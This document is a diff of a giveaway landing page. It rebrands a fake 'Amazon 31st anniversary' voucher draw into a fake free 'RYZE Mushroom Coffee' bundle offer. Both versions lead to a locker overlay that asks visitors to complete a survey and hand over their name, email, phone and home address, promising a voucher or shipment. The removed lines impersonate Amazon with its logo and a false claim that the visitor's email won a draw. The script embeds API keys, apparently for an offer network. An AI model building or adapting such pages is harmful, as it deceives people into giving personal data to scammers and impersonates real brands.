@@ -45,12 +45,7 @@
         }
         
         .header-logo { margin-bottom: 12px; margin-top: 5px; }
-        
-        .header-logo img { 
-            height: 20px; 
-            width: auto; 
-            filter: invert(1); 
-        }
+        .header-logo img { width: 105px; height: auto; }
 
         .anniversary-full-card { 
             background: rgba(184, 134, 11, 0.05); 
@@ -69,30 +64,7 @@
             position: relative; box-shadow: 0 30px 60px rgba(0,0,0,0.5);
         }
 
-        /* التعديل هنا: إضافة تأثير الطفو والإضاءة الذهبية المتحركة خلف الكارد المين */
-        .product-container { 
-            position: relative; 
-            width: 220px; 
-            margin: -150px auto 20px; 
-            z-index: 100;
-            animation: card-float 4s infinite ease-in-out;
-        }
-
-        /* هالة ضوئية ذهبية نابضة وراء الكارد مباشرة لزيادة الجاذبية */
-        .product-container::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 160px;
-            height: 160px;
-            background: radial-gradient(circle, rgba(245, 210, 122, 0.4) 0%, rgba(184, 134, 11, 0) 70%);
-            z-index: 99;
-            animation: glow-pulse 2s infinite alternate ease-in-out;
-            pointer-events: none;
-        }
-
+        .product-container { position: relative; width: 200px; margin: -150px auto 20px; z-index: 100; }
         .product-info-overlay {
             position: absolute; bottom: 15px; left: -30px; background: rgba(184, 134, 11, 0.98);
             color: #000; padding: 8px 12px; border-radius: 12px; font-size: 11px;
@@ -101,28 +73,7 @@
             animation: float-info 3s infinite alternate ease-in-out;
         }
         @keyframes float-info { 0% { transform: rotate(-5deg) translateY(0); } 100% { transform: rotate(-5deg) translateY(-8px); } }
-        
-        /* تحسين الظلال الخاصة بالصورة لجعلها ثلاثية الأبعاد */
-        .product-display img { 
-            width: 100%; 
-            height: auto; 
-            object-fit: contain; 
-            filter: drop-shadow(0 15px 25px rgba(245, 210, 122, 0.3)) drop-shadow(0 30px 50px rgba(0,0,0,0.8)); 
-            position: relative; 
-            z-index: 101; 
-        }
-
-        /* تعريف حركات الـ CSS الجديدة */
-        @keyframes card-float {
-            0% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-12px) rotate(1deg); }
-            100% { transform: translateY(0) rotate(0deg); }
-        }
-
-        @keyframes glow-pulse {
-            0% { opacity: 0.5; transform: translate(-50%, -50%) scale(0.9); }
-            100% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); }
-        }
+        .product-display img { width: 100%; filter: drop-shadow(0 20px 40px rgba(0,0,0,0.6)); position: relative; z-index: 101; }
 
         .stock-labels { display: flex; justify-content: space-between; margin-bottom: 8px; }
         .stock-label-left { color: var(--text-gray); font-size: 12px; font-weight: 800; }
@@ -157,17 +108,21 @@
 
     <div class="page-wrapper" id="main-content">
         <div class="header-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
+            <img src="https://i.postimg.cc/XqrBgQs2/telechargement-(4).png">
         </div>
 
         <div class="anniversary-full-card">
-            <div class="main-text">"Dear customer, this day is special to us, not like any other day! It is the thirty-first anniversary of <span class="highlight">Amazon's</span> founding. On the occasion of this anniversary, we wanted to thank our customers for their trust in Amazon over the years. We have conducted a random draw for many of our customers, and your email address was selected in this draw, along with many other customers. Therefore, we are contacting you to receive a shopping voucher ranging in value from <span class="highlight">$100</span> to <span class="highlight">$1000</span>, which can be used in our Amazon store. To find out the value of the voucher, follow the instructions below."</div>
+            <div class="main-text">"Celebrating a decade of <span class="highlight">RYZE.</span> As a thank you, we are offering our latest product absolutely FREE. Don’t miss our most exclusive giveaway yet!</div>
         </div>
 
         <div class="main-card">
             <div class="product-container">
+                <div class="product-info-overlay">
+                    🚀 NEW RELEASE<br>
+                    <span style="font-size: 8px; opacity: 0.8;">LIMITED EDITION BUNDLE</span>
+                </div>
                 <div class="product-display">
-                    <img src="https://i.postimg.cc/SNjdbxsN/bg-1e40bc66-7f7a-4570-ba81-25ef25d0eeb9.png" alt="Amazon $5 Gift Card">
+                    <img src="https://i.postimg.cc/XJC0c5wQ/Creamer-ryze-n-shine-bundle-coffee-creamer-1.png">
                 </div>
             </div>
             
@@ -190,19 +145,19 @@
 
     <div class="overlay" id="locker">
         <div class="locker">
-            <div style="background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; font-size: 26px; margin-bottom: 15px; text-transform: uppercase;">Amazon's 31st Anniversary</div>
+            <div style="background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; font-size: 26px; margin-bottom: 15px; text-transform: uppercase;">RYZE Mushroom Coffee</div>
             <div style="font-weight: 800; font-size: 18px; color:#2ecc71; margin-bottom: 20px;">INFORMATION REQUIRED 👇:</div>
             <div id="verification-content">
                 <div class="step-item"><div class="step-number">1</div><div class="step-text">Complete the short survey</div></div>
-                <div class="step-item"><div class="step-number">2</div><div class="step-text">Please provide your Name, Email, Phone number, and Address accurately. Entering this information correctly is essential to ensure that you receive your gift voucher without any issues.</div></div>
-                <div class="step-item"><div class="step-number">3</div><div class="step-text">Once you have completed all the steps, your gift voucher will be sent immediately to your email. You can then use it to shop at our Amazon store.</div></div>
+                <div class="step-item"><div class="step-number">2</div><div class="step-text">Provide details (Name, Email, Phone, & Address)</div></div>
+                <div class="step-item"><div class="step-number">3</div><div class="step-text">After completing the steps, you will immediately receive an SMS text message containing your Shipping Tracking Number.</div></div>
             </div>
             <button class="start-btn" style="margin-top:15px;" id="offer-btn">START</button>
         </div>
     </div>
 
     <script>
-        const API_KEY = "44176|sY44XX0OMsjMPNhHGEJKHJ5Agi2LzTRHpuBbe3QV09309663";
+        const API_KEY = "44196|phY6dpDRI1n2O1SqMzVjSxXvl1q3JhoxRpWLQiakd0c6bad3";
         let lockerActive = false;
 
         function initPage() {
